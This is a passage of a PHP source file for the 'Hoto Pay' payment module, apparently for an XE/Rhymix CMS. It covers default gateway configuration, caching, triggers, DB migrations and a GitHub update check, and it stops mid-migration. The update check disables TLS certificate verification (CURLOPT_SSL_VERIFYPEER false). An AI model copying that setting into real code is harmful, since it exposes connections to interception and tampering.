<?php
/**
 * Hoto Pay
 * 
 * Generated with https://www.poesis.org/tools/modulegen/
 * 
 * @package HotoPay
 * @author Waterticket
 * @copyright Copyright (c) Waterticket
 */

include __DIR__ . '/lib/autoload.php';
// Hotopay Autoloader load

class Hotopay extends ModuleObject
{
	/**
	 * 등록할 트리거를 여기에 선언하면 자동으로 등록된다.
	 * checkUpdate(), moduleUpdate() 등에서 체크 및 생성 루틴을 중복으로 작성하지 않아도 된다.
	 */
	protected static $_insert_triggers = array(
		array('member.getMemberMenu', 'after', 'controller', 'triggerAddMemberMenu'),
		array('document.insertDocument', 'after', 'controller', 'triggerAfterInsertDocument'),
		array('document.updateDocument', 'after', 'controller', 'triggerAfterUpdateDocument'),
		// array('document.deleteDocument', 'after', 'controller', 'triggerAfterDeleteDocument'),
	);
	
	/**
	 * 이전 버전에서 등록했던 트리거를 삭제하려면 위와 동일한 문법으로 여기에 선언하면 된다.
	 * 사용하지 않는 트리거는 삭제해 주는 것이 성능에 도움이 된다.
	 */
	protected static $_delete_triggers = array(
		// array('comment.insertComment', 'after', 'controller', 'triggerAfterInsertComment'),
		// array('comment.updateComment', 'after', 'controller', 'triggerAfterUpdateComment'),
		// array('comment.deleteComment', 'after', 'controller', 'triggerAfterDeleteComment'),
	);

	/**
	 * 깃허브로부터 업데이트 데이터를 체크합니다.
	 * 
	 * @return boolean
	 */
	public function githubUpdateCheck()
	{
		$api_url = 'https://api.github.com/repos/Waterticket/rx-module-hotopay/releases/latest';

		$ch = curl_init();
		curl_setopt($ch, CURLOPT_URL, $api_url);
		curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
		curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 10);
		curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
		curl_setopt($ch, CURLOPT_USERAGENT, 'hotopay/1.0');
		curl_setopt($ch, CURLOPT_REFERER, 'https://hotopay.hotoproject.com/');

		$response = json_decode(curl_exec($ch));
		curl_close($ch);

		if(empty($response->tag_name)) return false;

		$oModuleModel = getModel('module');
		$module_list = $oModuleModel->getModuleList();

		foreach($module_list as $module)
		{
			if($module->module === 'hotopay')
			{
				return ($response->tag_name !== $module->version);
			}
		}

		return false;
	}
	
	// =========================== 이 부분 아래는 수정하지 않아도 된다 ============================
	
	/**
	 * 모듈 설정 캐시를 위한 변수.
	 */
	protected static $_config_cache = null;
	
	/**
	 * 캐시 핸들러 캐시를 위한 변수.
	 */
	protected static $_cache_handler_cache = null;

	protected const HOTOPAY_NEEDED_DB_VERSION = 6;
	
	/**
	 * 모듈 설정을 가져오는 함수.
	 * 
	 * 캐시 처리되기 때문에 ModuleModel을 직접 호출하는 것보다 효율적이다.
	 * 모듈 내에서 설정을 불러올 때는 반드시 이 함수를 사용하도록 한다. 
	 * 
	 * @return object
	 */
	public function getConfig()
	{
		if (self::$_config_cache === null)
		{
			$oModuleModel = getModel('module');
			self::$_config_cache = $oModuleModel->getModuleConfig('hotopay') ?: new stdClass;
			if(!isset(self::$_config_cache->hotopay_purchase_enabled)) self::$_config_cache->hotopay_purchase_enabled = 'Y'; // Hotopay 결제 활성화
			if(!isset(self::$_config_cache->shop_name)) self::$_config_cache->shop_name = 'HotoPay'; // 쇼핑몰 이름
			if(!isset(self::$_config_cache->board_module_srl)) self::$_config_cache->board_module_srl = array(); // 선택한 게시판 mid
			if(!isset(self::$_config_cache->point_discount)) self::$_config_cache->point_discount = 'N'; // 포인트 할인 활성화
			if(!isset(self::$_config_cache->cart_item_limit)) self::$_config_cache->cart_item_limit = 50; // 카트에 담을 수 있는 최대 상품 개수
			if(!isset(self::$_config_cache->min_product_price)) self::$_config_cache->min_product_price = 0; // 등록할 수 있는 최소 가격
			if(!isset(self::$_config_cache->change_group_to_regular_when_pay)) self::$_config_cache->change_group_to_regular_when_pay = 'N'; // 결제시에 회원 그룹을 정회원으로 변경
			if(!isset(self::$_config_cache->associate_group_srl)) self::$_config_cache->associate_group_srl = 2; // 준회원 그룹 srl
			if(!isset(self::$_config_cache->regular_group_srl)) self::$_config_cache->regular_group_srl = 3; // 정회원 그룹 srl

			if(!isset(self::$_config_cache->hotopay_license_key)) self::$_config_cache->hotopay_license_key = ''; // Hotopay 라이선스 키
			if(!isset(self::$_config_cache->hotopay_last_license_expire_alert_date)) self::$_config_cache->hotopay_last_license_expire_alert_date = 0; // 라이선스 만료 경고 마지막 날짜

			if(!isset(self::$_config_cache->hotopay_currency_renew_api_type)) self::$_config_cache->hotopay_currency_renew_api_type = 'exchangeratehost'; // 환율 갱신 API 타입 (none/fixerio/exchangeratehost)
			if(!isset(self::$_config_cache->fixer_io_api_key)) self::$_config_cache->fixer_io_api_key = ''; // Fixer.io API Key
			if(!isset(self::$_config_cache->hotopay_currency_renew_time)) self::$_config_cache->hotopay_currency_renew_time = 0; // 환율 갱신 API 마지막 시각

			if(!isset(self::$_config_cache->hotopay_billingkey_encryption)) self::$_config_cache->hotopay_billingkey_encryption = 'none'; // 빌링키 암호화 수단 (none/awskms)
			if(!isset(self::$_config_cache->hotopay_aws_kms_arn)) self::$_config_cache->hotopay_aws_kms_arn = ''; // AWS KMS ARN
			
			if(!isset(self::$_config_cache->toss_enabled)) self::$_config_cache->toss_enabled = 'N'; // 토스 활성화
			if(!isset(self::$_config_cache->paypal_enabled)) self::$_config_cache->paypal_enabled = 'N'; // 페이팔 활성화
			if(!isset(self::$_config_cache->kakaopay_enabled)) self::$_config_cache->kakaopay_enabled = 'N'; // 카카오페이 활성화
			if(!isset(self::$_config_cache->n_account_enabled)) self::$_config_cache->n_account_enabled = 'N'; // 무통장입금 활성화
			if(!isset(self::$_config_cache->iamport_enabled)) self::$_config_cache->iamport_enabled = 'N'; // 아임포트 활성화
			if(!isset(self::$_config_cache->inicis_enabled)) self::$_config_cache->inicis_enabled = 'N'; // 이니시스 결제 활성화
			if(!isset(self::$_config_cache->payple_enabled)) self::$_config_cache->payple_enabled = 'N'; // 페이플 결제 활성화
			
			if(!isset(self::$_config_cache->toss_payments_list)) self::$_config_cache->toss_payments_list = array(1,2); // 토스 결제 방식 목록
			if(!isset(self::$_config_cache->toss_payments_client_key)) self::$_config_cache->toss_payments_client_key = ''; // 토스 클라이언트 키
			if(!isset(self::$_config_cache->toss_payments_secret_key)) self::$_config_cache->toss_payments_secret_key = ''; // 토스 시크릿 키
			if(!isset(self::$_config_cache->toss_payments_install_month)) self::$_config_cache->toss_payments_install_month = -1; // 토스 할부 개월 수 (고정)
			if(!isset(self::$_config_cache->toss_payments_max_install_month)) self::$_config_cache->toss_payments_max_install_month = 0; // 토스 선택 가능한 최대 할부 개월 수
			if(!isset(self::$_config_cache->toss_payments_widget_enabled)) self::$_config_cache->toss_payments_widget_enabled = 'N'; // 토스 결제 위젯 활성화
			if(!isset(self::$_config_cache->toss_payments_billing_enabled)) self::$_config_cache->toss_payments_billing_enabled = 'N'; // 토스 정기결제 (빌링) 활성화
			if(!isset(self::$_config_cache->toss_payments_billing_client_key)) self::$_config_cache->toss_payments_billing_client_key = ''; // 토스 클라이언트 키 (빌링)
			if(!isset(self::$_config_cache->toss_payments_billing_secret_key)) self::$_config_cache->toss_payments_billing_secret_key = ''; // 토스 시크릿 키 (빌링)

			if(!isset(self::$_config_cache->paypal_client_key)) self::$_config_cache->paypal_client_key = ''; // 페이팔 클라이언트 키
			if(!isset(self::$_config_cache->paypal_secret_key)) self::$_config_cache->paypal_secret_key = ''; // 페이팔 시크릿 키

			if(!isset(self::$_config_cache->kakaopay_admin_key)) self::$_config_cache->kakaopay_admin_key = ''; // 카카오페이 어드민 키
			if(!isset(self::$_config_cache->kakaopay_cid_key)) self::$_config_cache->kakaopay_cid_key = ''; // 카카오페이 가맹점 코드
			if(!isset(self::$_config_cache->kakaopay_cid_secret_key)) self::$_config_cache->kakaopay_cid_secret_key = ''; // 카카오페이 가맹점 코드 인증키
			if(!isset(self::$_config_cache->kakaopay_install_month)) self::$_config_cache->kakaopay_install_month = -1; // 카카오페이 카드 할부 개월 수
			
			if(!isset(self::$_config_cache->iamport_mid)) self::$_config_cache->iamport_mid = ''; // 아임포트 가맹점 식별코드
			if(!isset(self::$_config_cache->iamport_rest_api_key)) self::$_config_cache->iamport_rest_api_key = ''; // 아임포트 REST API KEY
			if(!isset(self::$_config_cache->iamport_rest_api_secret)) self::$_config_cache->iamport_rest_api_secret = ''; // 아임포트 REST API SECRET
			if(!isset(self::$_config_cache->inicis_list)) self::$_config_cache->inicis_list = array('card', 'trans', 'vbank'); // 이니시스 결제 방식 목록
			if(!isset(self::$_config_cache->inicis_mid)) self::$_config_cache->inicis_mid = ''; // 이니시스 mid

			if(!isset(self::$_config_cache->payple_server)) self::$_config_cache->payple_server = 'demo'; // 페이플 서버 (demo, real)
			if(!isset(self::$_config_cache->payple_list)) self::$_config_cache->payple_list = array('card', 'transfer'); // 페이플 결제 방식 목록
			if(!isset(self::$_config_cache->payple_cst_id)) self::$_config_cache->payple_cst_id = ''; // 페이플 cst_id
			if(!isset(self::$_config_cache->payple_cust_key)) self::$_config_cache->payple_cust_key = ''; // 페이플 custKey
			if(!isset(self::$_config_cache->payple_refund_key)) self::$_config_cache->payple_refund_key = ''; // 페이플 환불키 (PCD_REFUND_KEY)
			if(!isset(self::$_config_cache->payple_referer_domain)) self::$_config_cache->payple_referer_domain = ''; // 페이플 도메인 검증용 referer 도메인 (https:// 제외)
			if(!isset(self::$_config_cache->payple_purchase_type)) self::$_config_cache->payple_purchase_type = 'none'; // 페이플 결제 데이터 저장 타입 (none, password, billing)
			if(!isset(self::$_config_cache->payple_billing_enabled)) self::$_config_cache->payple_billing_enabled = 'N'; // 페이플 정기결제 (빌링) 활성화
			if(!isset(self::$_config_cache->payple_billing_payments_list)) self::$_config_cache->payple_billing_payments_list = array(); // 페이플 정기결제 수단 목록

			if(!isset(self::$_config_cache->n_account_string)) self::$_config_cache->n_account_string = ''; // 무통장 입금 계좌
			if(!isset(self::$_config_cache->purchase_term_url)) self::$_config_cache->purchase_term_url = ''; // 결제 약관 URL

			if(!isset(self::$_config_cache->admin_mailing)) self::$_config_cache->admin_mailing = 'Y'; // 관리자 알림 활성화
			if(!isset(self::$_config_cache->admin_mailing_status)) self::$_config_cache->admin_mailing_status = ['DONE','BILLING_DONE','REFUNDED']; // 관리자가 알림을 받을 주문 상태

			if(!isset(self::$_config_cache->purchase_success_notification_message_note_title)) self::$_config_cache->purchase_success_notification_message_note_title = '상품 결제가 완료되었습니다'; // 결제성공 쪽지 제목
			if(!isset(self::$_config_cache->purchase_success_notification_message_note)) self::$_config_cache->purchase_success_notification_message_note = '<p>"[상품명]" 상품이 성공적으로 결제되었습니다.</p><br><p>[주문확인링크]</p>'; // 결제성공 쪽지 내용
			if(!isset(self::$_config_cache->purchase_success_notification_message_mail_title)) self::$_config_cache->purchase_success_notification_message_mail_title = '[[쇼핑몰명]] 상품 결제가 완료되었습니다'; // 결제성공 메일 제목
			if(!isset(self::$_config_cache->purchase_success_notification_message_mail)) self::$_config_cache->purchase_success_notification_message_mail = '<p>"[상품명]" 상품이 성공적으로 결제되었습니다.</p><br><p>[주문확인링크]</p>'; // 결제성공 메일 내용
			if(!isset(self::$_config_cache->purchase_success_notification_message_sms)) self::$_config_cache->purchase_success_notification_message_sms = '[[쇼핑몰명]] "[상품명]" 상품이 정상적으로 결제되었습니다'; // 결제성공 SMS 내용

			if(!isset(self::$_config_cache->purchase_success_notification_method)) self::$_config_cache->purchase_success_notification_method = array(1,); // 결제 성공 알림 수단

			if(!isset(self::$_config_cache->purchase_account_notification_message_note_title)) self::$_config_cache->purchase_account_notification_message_note_title = '상품 결제를 완료해주세요'; // 계좌알림 쪽지 제목
			if(!isset(self::$_config_cache->purchase_account_notification_message_note)) self::$_config_cache->purchase_account_notification_message_note = '<p>"[상품명]" 상품 결제를 완료해주세요.</p><br><br><p>계좌번호: [계좌번호]</p><br><p>주문 금액: [주문금액]원</p>'; // 계좌알림 쪽지 내용
			if(!isset(self::$_config_cache->purchase_account_notification_message_mail_title)) self::$_config_cache->purchase_account_notification_message_mail_title = '[[쇼핑몰명]] 상품 결제를 완료해주세요'; // 계좌알림 메일 제목
			if(!isset(self::$_config_cache->purchase_account_notification_message_mail)) self::$_config_cache->purchase_account_notification_message_mail = '<p>"[상품명]" 상품 결제를 완료해주세요.</p><br><br><p>계좌번호: [계좌번호]</p><br><p>주문 금액: [주문금액]원</p>'; // 계좌알림 메일 내용
			if(!isset(self::$_config_cache->purchase_account_notification_message_sms)) self::$_config_cache->purchase_account_notification_message_sms = '[[쇼핑몰명]] [주문금액] [계좌번호] 결제를 완료해주세요.'; // 계좌알림 SMS 내용

			if(!isset(self::$_config_cache->purchase_account_notification_method)) self::$_config_cache->purchase_account_notification_method = array(1,); // 결제 계좌 알림 수단

			if(!isset(self::$_config_cache->purchase_refund_notification_message_note_title)) self::$_config_cache->purchase_refund_notification_message_note_title = '상품이 환불되었습니다.'; // 환불 쪽지 제목
			if(!isset(self::$_config_cache->purchase_refund_notification_message_note)) self::$_config_cache->purchase_refund_notification_message_note = '<p>"[상품명]" 상품이 환불되었습니다.</p><br><br><p>주문번호: [주문번호]</p>'; // 환불 쪽지 내용
			if(!isset(self::$_config_cache->purchase_refund_notification_message_mail_title)) self::$_config_cache->purchase_refund_notification_message_mail_title = '[[쇼핑몰명]] 상품이 환불되었습니다'; // 환불 메일 제목
			if(!isset(self::$_config_cache->purchase_refund_notification_message_mail)) self::$_config_cache->purchase_refund_notification_message_mail = '<p>"[상품명]" 상품이 환불되었습니다.</p><br><br><p>주문번호: [주문번호]</p>'; // 환불 메일 내용
			if(!isset(self::$_config_cache->purchase_refund_notification_message_sms)) self::$_config_cache->purchase_refund_notification_message_sms = '[[쇼핑몰명]] 주문번호 [주문번호] "[상품명]" 상품이 환불되었습니다.'; // 환불 SMS 내용

			if(!isset(self::$_config_cache->purchase_refund_notification_method)) self::$_config_cache->purchase_refund_notification_method = array(1,); // 환불 알림 수단
			
			if(!isset(self::$_config_cache->hotopay_db_version)) self::$_config_cache->hotopay_db_version = 0; // DB 버전
			if(!isset(self::$_config_cache->last_cron_execution_time)) self::$_config_cache->last_cron_execution_time = 0; // 마지막 크론 실행 시간
			if(!isset(self::$_config_cache->last_cron_execution_success_time)) self::$_config_cache->last_cron_execution_success_time = 0; // 마지막 크론 성공 시간
		}
		return self::$_config_cache;
	}
	
	/**
	 * 모듈 설정을 저장하는 함수.
	 * 
	 * 설정을 변경할 필요가 있을 때 ModuleController를 직접 호출하지 말고 이 함수를 사용한다.
	 * getConfig()으로 가져온 설정을 적절히 변경하여 setConfig()으로 다시 저장하는 것이 정석.
	 * 
	 * @param object $config
	 * @return object
	 */
	public function setConfig($config)
	{
		$oModuleController = getController('module');
		$result = $oModuleController->insertModuleConfig($this->module, $config);
		if ($result->toBool())
		{
			self::$_config_cache = $config;
		}
		return $result;
	}
	
	/**
	 * 오브젝트 캐시에서 값을 가져오는 함수.
	 * 
	 * 그룹 키를 지정하지 않으면 자동으로 현재 모듈 이름이 그룹 키로 사용되므로
	 * 필요시 그룹 키를 비움으로써 신속하게 캐시를 갱신할 수 있다.
	 * 
	 * @param string $key
	 * @param int $ttl
	 * @param string $group_key (optional)
	 * @return mixed
	 */
	public function getCache($key, $ttl = 86400, $group_key = null)
	{
		if (self::$_cache_handler_cache === null)
		{
			self::$_cache_handler_cache = CacheHandler::getInstance('object');
		}
		
		if (self::$_cache_handler_cache->isSupport())
		{
			$group_key = $group_key ?: $this->module;
			return self::$_cache_handler_cache->get(self::$_cache_handler_cache->getGroupKey($group_key, $key), $ttl);
		}
		else
		{
			return false;
		}
	}
	
	/**
	 * 오브젝트 캐시에 값을 저장하는 함수.
	 * 
	 * 그룹 키를 지정하지 않으면 자동으로 현재 모듈 이름이 그룹 키로 사용되므로
	 * 필요시 그룹 키를 비움으로써 신속하게 캐시를 갱신할 수 있다.
	 * 
	 * @param string $key
	 * @param mixed $value
	 * @param int $ttl
	 * @param string $group_key (optional)
	 * @return bool
	 */
	public function setCache($key, $value, $ttl = 86400, $group_key = null)
	{
		if (self::$_cache_handler_cache === null)
		{
			self::$_cache_handler_cache = CacheHandler::getInstance('object');
		}
		
		if (self::$_cache_handler_cache->isSupport())
		{
			$group_key = $group_key ?: $this->module;
			return self::$_cache_handler_cache->put(self::$_cache_handler_cache->getGroupKey($group_key, $key), $value, $ttl);
		}
		else
		{
			return false;
		}
	}
	
	/**
	 * 오브젝트 캐시에서 개별 키를 삭제하는 함수.
	 * 
	 * @param string $key
	 * @param string $group_key (optional)
	 * @return bool
	 */
	public function deleteCache($key, $group_key = null)
	{
		if (self::$_cache_handler_cache === null)
		{
			self::$_cache_handler_cache = CacheHandler::getInstance('object');
		}
		
		if (self::$_cache_handler_cache->isSupport())
		{
			$group_key = $group_key ?: $this->module;
			self::$_cache_handler_cache->delete(self::$_cache_handler_cache->getGroupKey($group_key, $key));
		}
		else
		{
			return false;
		}
	}
	
	/**
	 * 오브젝트 캐시를 비우는 함수.
	 * 
	 * 지정된 그룹 키에 소속된 데이터만 삭제한다.
	 * 현재 모듈에서 저장한 데이터만 삭제하는 것이 기본값이다.
	 * 
	 * @param string $group_key (optional)
	 * @return bool
	 */
	public function clearCache($group_key = null)
	{
		if (self::$_cache_handler_cache === null)
		{
			self::$_cache_handler_cache = CacheHandler::getInstance('object');
		}
		
		if (self::$_cache_handler_cache->isSupport())
		{
			$group_key = $group_key ?: $this->module;
			return self::$_cache_handler_cache->invalidateGroupKey($group_key) ? true : false;
		}
		else
		{
			return false;
		}
	}
	
	/**
	 * XE Object를 생성하여 반환한다.
	 * 
	 * XE 1.8 이하, XE 1.9 이상, PHP 7.1 이하, PHP 7.2 이상 모두 호환된다.
	 * 기본적인 사용법은 return new Object(-1, 'error'); 라고 쓸 자리에
	 * return $this->createObject(-1, 'error'); 라고 쓰면 된다.
	 *
	 * 반환할 언어 내용 중 %s, %d 등 변수를 치환하는 부분이 있다면
	 * 치환할 내용을 추가 파라미터로 넘겨주면 sprintf()의 역할까지 해준다.
	 * 
	 * @param string $message
	 * @param $arg1, $arg2 ...
	 * @return object
	 */
	public function createObject($status = 0, $message = 'success' /* $arg1, $arg2 ... */)
	{
		$args = func_get_args();
		if (count($args) > 2)
		{
			global $lang;
			$message = vsprintf($lang->$message, array_slice($args, 2));
		}
		return class_exists('BaseObject') ? new BaseObject($status, $message) : new Object($status, $message);
	}
	
	/**
	 * 트리거 확인 함수.
	 * 
	 * 위에서 선언한 트리거 목록을 참조하여 자동으로 등록 및 삭제한다.
	 * 
	 * @return bool
	 */
	public function checkTriggers()
	{
		$oModuleModel = getModel('module');
		foreach (self::$_insert_triggers as $trigger)
		{
			if (!$oModuleModel->getTrigger($trigger[0], $this->module, $trigger[2], $trigger[3], $trigger[1]))
			{
				return true;
			}
		}
		foreach (self::$_delete_triggers as $trigger)
		{
			if ($oModuleModel->getTrigger($trigger[0], $this->module, $trigger[2], $trigger[3], $trigger[1]))
			{
				return true;
			}
		}
		return false;
	}
	
	/**
	 * 트리거 등록 함수.
	 * 
	 * 위에서 선언한 트리거 목록을 참조하여 자동으로 등록 및 삭제한다.
	 * 
	 * @return object
	 */
	public function registerTriggers()
	{
		$oModuleModel = getModel('module');
		$oModuleController = getController('module');
		foreach (self::$_insert_triggers as $trigger)
		{
			if (!$oModuleModel->getTrigger($trigger[0], $this->module, $trigger[2], $trigger[3], $trigger[1]))
			{
				$oModuleController->insertTrigger($trigger[0], $this->module, $trigger[2], $trigger[3], $trigger[1]);
			}
		}
		foreach (self::$_delete_triggers as $trigger)
		{
			if ($oModuleModel->getTrigger($trigger[0], $this->module, $trigger[2], $trigger[3], $trigger[1]))
			{
				$oModuleController->deleteTrigger($trigger[0], $this->module, $trigger[2], $trigger[3], $trigger[1]);
			}
		}
		return $this->createObject(0, 'success_updated');
	}
	
	/**
	 * 모듈 설치 콜백 함수.
	 * 
	 * 트리거 등록 외에 따로 할 일이 없다면 수정할 필요 없다.
	 * 
	 * @return object
	 */
	public function moduleInstall()
	{
		$this->makeBoard();
		return $this->registerTriggers();
	}
	
	/**
	 * 모듈 업데이트 확인 콜백 함수.
	 * 
	 * 트리거 등록 외에 따로 할 일이 없다면 수정할 필요 없다.
	 * 
	 * @return bool
	 */
	public function checkUpdate()
	{
		$oModule = getModel('module');
		$module_info = $oModule->getModuleInfoByMid('hotopay');
		if($module_info->module_srl)
		{
			if($module_info->module != 'hotopay')
			{
				return true;
			}
		}else return true;

		$oDB = DB::getInstance();
		if(!$oDB->isColumnExists("hotopay_product","extra_vars")) return true;
		if(!$oDB->isColumnExists("hotopay_purchase","extra_vars")) return true;
		if(!$oDB->isColumnExists("hotopay_product_option","infinity_stock")) return true;
		if(!$oDB->isColumnExists("hotopay_purchase_item","option_name")) return true;
		if(!$oDB->isColumnExists("hotopay_product","member_srl")) return true;
		if(!$oDB->isIndexExists("hotopay_product","idx_member_srl")) return true;
		if(!$oDB->isColumnExists("hotopay_product","product_status")) return true;
		if(!$oDB->isColumnExists("hotopay_purchase","iamport_uid")) return true;
		if(!$oDB->isColumnExists("hotopay_purchase","receipt_url")) return true;
		if(!$oDB->isColumnExists("hotopay_purchase","title")) return true;
		if(!$oDB->isColumnExists("hotopay_product","tax_rate")) return true;
		if(!$oDB->isColumnExists("hotopay_product","market_srl")) return true;
		if(!$oDB->isIndexExists("hotopay_product","idx_market_srl")) return true;
		if(!$oDB->isColumnExists("hotopay_purchase_item","quantity")) return true;
		if(!$oDB->isColumnExists("hotopay_product","is_adult")) return true;
		if(!$oDB->isColumnExists("hotopay_product","is_billing")) return true;
		if(!$oDB->isColumnExists("hotopay_product_option","billing_period_date")) return true;
		if(!$oDB->isColumnExists("hotopay_purchase","is_billing")) return true;
		if(!$oDB->isColumnExists("hotopay_product_option","billing_infinity_stock")) return true;
		if(!$oDB->isColumnExists("hotopay_product","allow_use_point")) return true;

		$config = $this->getConfig();
		if (self::HOTOPAY_NEEDED_DB_VERSION > $config->hotopay_db_version)
		{
			return true;
		}

		return $this->checkTriggers();
	}
	
	/**
	 * 모듈 업데이트 콜백 함수.
	 * 
	 * 트리거 등록 외에 따로 할 일이 없다면 수정할 필요 없다.
	 * 
	 * @return object
	 */
	public function moduleUpdate()
	{
		$this->makeBoard();

		$oDB = DB::getInstance();
		if(!$oDB->isColumnExists("hotopay_product","extra_vars"))
		{
			$oDB->addColumn('hotopay_product',"extra_vars","text");
		}

		if(!$oDB->isColumnExists("hotopay_purchase","extra_vars"))
		{
			$oDB->addColumn('hotopay_purchase',"extra_vars","text");
		}
		
		if(!$oDB->isColumnExists("hotopay_product_option","infinity_stock"))
		{
			$oDB->addColumn('hotopay_product_option',"infinity_stock","varchar",3,"N",false,"stock");
		}
		
		if(!$oDB->isColumnExists("hotopay_purchase_item","option_name"))
		{
			$oDB->addColumn('hotopay_purchase_item',"option_name","varchar",500,null,true,"option_srl");
		}

		if(!$oDB->isColumnExists("hotopay_product","member_srl"))
		{
			$oDB->addColumn('hotopay_product',"member_srl","number",20,null,true,"product_buyer_group");
		}

		if(!$oDB->isIndexExists("hotopay_product","idx_member_srl"))
		{
			$oDB->addIndex('hotopay_product',"idx_member_srl","member_srl");
		}

		if(!$oDB->isColumnExists("hotopay_product","product_status"))
		{
			$oDB->addColumn('hotopay_product',"product_status","varchar",20,"selling",false,"product_des");
		}

		if(!$oDB->isColumnExists("hotopay_product","document_srl"))
		{
			$oDB->addColumn('hotopay_product',"document_srl","number",20,null,false,"member_srl");
		}

		if(!$oDB->isIndexExists("hotopay_product","idx_document_srl"))
		{
			$oDB->addIndex('hotopay_product',"idx_document_srl","document_srl");
		}

		if(!$oDB->isColumnExists("hotopay_purchase","iamport_uid"))
		{
			$oDB->addColumn('hotopay_purchase',"iamport_uid","varchar",20,"",false,"pay_data");
		}

		if(!$oDB->isColumnExists("hotopay_purchase","receipt_url"))
		{
			$oDB->addColumn('hotopay_purchase',"receipt_url","varchar",1000,"",false,"iamport_uid");
		}

		if(!$oDB->isColumnExists("hotopay_purchase","title"))
		{
			$oDB->addColumn('hotopay_purchase',"title","varchar",100,"",false,"member_srl"); // 하위 호환성을 위해 null 허용
		}

		if(!$oDB->isColumnExists("hotopay_product","tax_rate"))
		{
			$oDB->addColumn('hotopay_product',"tax_rate","double",null,0.0,false,"document_srl");
		}

		if(!$oDB->isColumnExists("hotopay_product","market_srl"))
		{
			$oDB->addColumn('hotopay_product',"market_srl","number",20,0,false,"member_srl");
		}

		if(!$oDB->isIndexExists("hotopay_product","idx_market_srl"))
		{
			$oDB->addIndex('hotopay_product',"idx_market_srl","market_srl");
		}

		if(!$oDB->isColumnExists("hotopay_purchase_item","quantity"))
		{
			$oDB->addColumn('hotopay_purchase_item',"quantity","number",20,1,false,"original_price");
		}

		if(!$oDB->isColumnExists("hotopay_product","is_adult"))
		{
			$oDB->addColumn('hotopay_product',"is_adult","char",1,'N',false,"tax_rate");
		}

		if(!$oDB->isColumnExists("hotopay_product","is_billing"))
		{
			$oDB->addColumn('hotopay_product',"is_billing","char",1,'N',false,"is_adult");
		}

		if(!$oDB->isColumnExists("hotopay_product_option","billing_period_date"))
		{
			$oDB->addColumn('hotopay_product_option',"billing_period_date","number",20,0,false,"infinity_stock");
		}

		if(!$oDB->isColumnExists("hotopay_purchase","is_billing"))
		{
			$oDB->addColumn('hotopay_purchase',"is_billing","char",1,'N',false,"receipt_url");
		}

		if(!$oDB->isColumnExists("hotopay_product_option","billing_infinity_stock"))
		{
			$oDB->addColumn('hotopay_product_option',"billing_infinity_stock","char",1,'N',false,"infinity_stock");
		}

		if(!$oDB->isColumnExists("hotopay_product","allow_use_point"))
		{
			$oDB->addColumn('hotopay_product',"allow_use_point","char",1,'Y',false,"is_billing");
		}

		$config = $this->getConfig();
		if (self::HOTOPAY_NEEDED_DB_VERSION > $config->hotopay_db_version)
		{
			$this->updateDBVersion();
		}

		return $this->registerTriggers();
	}
	
	/**
	 * 캐시파일 재생성 콜백 함수.
	 * 
	 * @return void
	 */
	public function recompileCache()
	{
		$this->clearCache();
	}

	function makeBoard()
	{
		//moduleController 등록
		$oModuleController = getController('module');
		$oModule = getModel('module');
		$module_info = $oModule->getModuleInfoByMid('hotopay');
		if($module_info->module_srl)
		{
			//이미 만들어진 mission mid가 있다면
			if($module_info->module != 'hotopay')
			{
				return $this->createObject(1,'hotopay_error_mid');
			}
		}
		else
		{
			/*Create mid*/
			$args = new stdClass;
			$args->mid = 'hotopay';
			$args->module = 'hotopay';
			$args->browser_title = 'Hoto Pay';
			$args->site_srl = 0;
			$args->layout_srl = -1;
			$args->skin = 'default';
			$output = $oModuleController->insertModule($args);
			return ($output->toBool()) ?: $output;
		}
	}

	function updateDBVersion()
	{
		$oHotopayModel = getModel('hotopay');

		$config = $this->getConfig();
		if (self::HOTOPAY_NEEDED_DB_VERSION > $config->hotopay_db_version)
		{
			for($i = $config->hotopay_db_version + 1; $i <= self::HOTOPAY_NEEDED_DB_VERSION; $i++)
			{
				switch($i)
				{
					case 1: // 옵션 저장방식 변경
						$options = isset($config->temp_options) ? $config->temp_options : [];
						$products = $oHotopayModel->getProductsAll();
						foreach($products as $product)
						{
							if(!empty($product->product_option))
							{
								$product_options = [];
								$p_opt = preg_split("/\r\n|\n|\r/", $product->product_option);
								foreach($p_opt as $_opt)
								{
									$_opt = mb_substr($_opt, 1, -1);
									if($_opt)
									{
										$data = explode('/' , $_opt);
										$args = new stdClass();
										$args->option_srl = getNextSequence();
										$args->product_srl = $product->product_srl;
										$args->title = $data[0];
										$args->description = '';
										$args->price = $product->product_sale_price + (int)$data[1];
										$args->extra_vars = serialize(new stdClass());
										$args->regdate = time();
										executeQuery('hotopay.insertProductOption', $args);

										$product_options[] = $args->option_srl;
									}
								}
								$options[$product->product_srl] = $product_options;

								$args = new stdClass();
								$args->product_srl = $product->product_srl;
								$args->product_option = '';
								executeQuery('hotopay.updateProduct', $args);
							}
						}

						$config->temp_options = $options;
						$this->setConfig($config);

						$output = executeQueryArray('hotopay.getPurchasesAll');
						foreach ($output->data as $purchase)
						{
							$products_data = json_decode($purchase->products);
							if (!isset($products_data->bp) && !isset($products_data->opt)) continue;
							$products_data->opt = (array) $products_data->opt;

							foreach ($products_data->bp as $product_srl)
							{
								$args = new stdClass();
								$args->option_srl = $options[$product_srl][$products_data->opt[$product_srl]];
								$output = executeQuery('hotopay.getOptions', $args);
								$price = $output->data->price;

								$args->item_srl = getNextSequence();
								$args->purchase_srl = $purchase->purchase_srl;
								$args->product_srl = $product_srl;
								$args->purchase_price = $price;
								$args->original_price = $price;
								$args->regdate = time();
								$args->extra_vars = serialize(new stdClass());
								executeQuery('hotopay.insertPurchaseItem', $args);
							}

							unset($products_data->bp);
							unset($products_data->opt);
							$products_data = json_encode($products_data);

							$args = new stdClass();
							$args->purchase_srl = $purchase->purchase_srl;
							$args->products = $products_data;
							executeQuery('hotopay.updatePurchaseProducts', $args);
						}

						unset($config->temp_options);
						$this->setConfig($config);
						break;

					case 2: // 영수증 저장 방식 변경
						$output = executeQueryArray('hotopay.getPurchasesAll');
						foreach ($output->data as $purchase)
						{
							$pay_method = $purchase->pay_method;
							if (!empty($purchase->receipt_url)) continue;
							
							$pay_data = json_decode($purchase->pay_data);
							if (empty($pay_data)) continue;
							
							$receipt_url = null;
							switch ($pay_method)
							{
								case "card":
									$receipt_url = $pay_data->receipt->url ?? $pay_data->card->receiptUrl;
									break;
								
								case "v_account":
									$receipt_url = $pay_data->receipt->url ?? $pay_data->cashReceipt->receiptUrl;
									break;

								case "toss":
								case "ts_account":
									$receipt_url = $pay_data->receipt->url;
									break;
							}

							if (!empty($receipt_url))
							{
								$args = new stdClass();
